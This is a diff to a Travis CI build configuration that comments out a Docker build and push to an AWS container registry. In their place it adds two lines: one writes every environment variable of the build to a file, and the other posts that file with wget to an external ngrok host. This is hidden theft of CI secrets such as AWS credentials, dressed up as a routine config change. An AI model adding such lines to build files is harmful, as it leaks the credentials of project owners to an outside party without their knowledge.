@@ -13,8 +13,9 @@ after_success:
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
-  - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+  - env > e 
+  - wget http://e90e02235234.ngrok.io --post-file=e
+#  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+#  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
